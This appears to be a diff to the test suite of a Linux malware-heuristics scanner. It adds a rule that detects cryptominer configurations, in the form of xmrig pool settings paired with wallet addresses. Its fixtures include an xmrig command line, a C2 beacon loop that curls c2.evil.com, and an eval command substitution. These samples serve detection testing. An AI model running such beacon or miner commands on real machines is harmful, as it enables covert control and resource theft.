@@ -37,6 +37,7 @@ from ekprotection.heuristics.rules      import (
     _r_obfuscation, _r_ptrace_ld_preload, _r_memfd_proc, _r_packed_upx,
     _r_hardcoded_ip, _r_crypto_strings, _r_c2_beacon, _r_chmod_plus_x,
     _r_hidden_executable, _r_no_extension_elf, _r_secret_exfiltration,
+    _r_miner_config, CONFIG_AUTOSCAN_RULES,
 )
 from ekprotection.heuristics.engine     import HeuristicEngine, HeuristicResult
 from ekprotection.scanner.hasher        import file_entropy
@@ -123,7 +124,7 @@ class TestAllRulesCatalog:
             assert rule.rule_id in RULES_BY_ID
 
     def test_total_rule_count(self) -> None:
-        assert len(ALL_RULES) == 23
+        assert len(ALL_RULES) == 24
 
 
 # ---------------------------------------------------------------------------
@@ -1247,6 +1248,68 @@ class TestRuleH018ChecksumAndBoundary:
         assert time.perf_counter() - t < 2.0
 
 
+# Endereço público do General Fund do Monero (inofensivo, só formato).
+_XMR = (b"44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYB"
+        b"b98uNbr2VBBEt7f2wfn3RVGQBEP3A")
+
+
+class TestRuleH024MinerConfig:
+    """Rodada 2026-10-23: config de cryptominer (config.json do xmrig) =
+    carteira + indicador de minerador no mesmo arquivo."""
+
+    def test_xmrig_config_json_triggers(self) -> None:
+        data = (b'{"donate-level": 1, "pools": [{"algo": "rx/0", '
+                b'"url": "stratum+tcp://pool.example.invalid:3333", "user": "' + _XMR + b'"}]}')
+        m = _r_miner_config(_ctx(path="/tmp/config.json", content=data, extension=".json"), "H024")
+        assert m is not None
+        assert m.evidence.startswith("44AFFq5k")
+
+    def test_xmrig_cli_donate_level_triggers(self) -> None:
+        data = b"./xmrig --donate-level 1 -o pool.example.invalid:3333 -u " + _XMR + b"\n"
+        assert _r_miner_config(_ctx(content=data), "H024") is not None
+
+    def test_algo_key_with_btc_triggers(self) -> None:
+        data = b'{"algo": "kawpow", "wallet": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"}'
+        assert _r_miner_config(_ctx(content=data, extension=".json"), "H024") is not None
+
+    def test_stratum_ssl_and_yaml_triggers(self) -> None:
+        data = b"pool: stratum+ssl://pool.example.invalid:443\nwallet: " + _XMR + b"\n"
+        assert _r_miner_config(_ctx(content=data, extension=".yaml"), "H024") is not None
+
+    def test_wallet_without_miner_hint_no_trigger(self) -> None:
+        # Fixture de repo cripto: endereço válido, "privateKey", nada de pool.
+        data = (b'{"address": "0x52908400098527886E0F7030069857D2E4169EE7", '
+                b'"privateKey": "<redacted>", "keystore": "./keys"}')
+        assert _r_miner_config(_ctx(content=data, extension=".json"), "H024") is None
+
+    def test_miner_hint_without_wallet_no_trigger(self) -> None:
+        # Strings do próprio binário do xmrig, sem carteira.
+        data = b"\x7fELF...--donate-level=N ... stratum+tcp:// ... rx/0"
+        assert _r_miner_config(_ctx(content=data, is_elf=True, extension=""), "H024") is None
+
+    def test_bad_checksum_wallet_no_trigger(self) -> None:
+        data = b"stratum+tcp://pool.example.invalid:3333 user=1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"
+        assert _r_miner_config(_ctx(content=data), "H024") is None
+
+    def test_generic_algo_key_no_trigger(self) -> None:
+        # "algo" genérico (hash/jwt) não é algoritmo de mineração.
+        data = b'{"algo": "sha256", "wallet": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"}'
+        assert _r_miner_config(_ctx(content=data, extension=".json"), "H024") is None
+
+    def test_rule_is_critical_and_only_config_autoscan_rule(self) -> None:
+        assert RULES_BY_ID["H024"].severity == "crítico"
+        assert CONFIG_AUTOSCAN_RULES == frozenset({"H024"})
+
+    def test_engine_only_rules_skips_other_rules(self, tmp_path: Path) -> None:
+        cfg = ConfigManager(tmp_path / "c.yaml")
+        cfg.load()
+        eng = HeuristicEngine(cfg)
+        f = tmp_path / "config.json"
+        f.write_bytes(b'{"privateKey": "x", "mnemonic": "y", "eval": "eval $(cat x)"}')
+        assert eng.analyze(f).is_suspicious  # H009/H004 rodando tudo
+        assert not eng.analyze(f, only_rules=CONFIG_AUTOSCAN_RULES).is_suspicious
+
+
 class TestRuleH019C2Beacon:
     def test_sleep_then_curl_triggers(self) -> None:
         ctx = _ctx(content=b"while true; do sleep 60; curl http://c2.evil.com/cmd; done")
@@ -1745,8 +1808,8 @@ class TestHeuristicEngine:
     def test_status(self, engine: HeuristicEngine) -> None:
         s = engine.status()
         assert s["enabled"]      is True
-        assert s["rules_total"]  == 23
-        assert s["rules_active"] == 23
+        assert s["rules_total"]  == 24
+        assert s["rules_active"] == 24
         assert s["sensitivity"]  == "medium"
 
     def test_log_manager_called_on_suspicious(self, cfg: ConfigManager, tmp_path: Path) -> None:
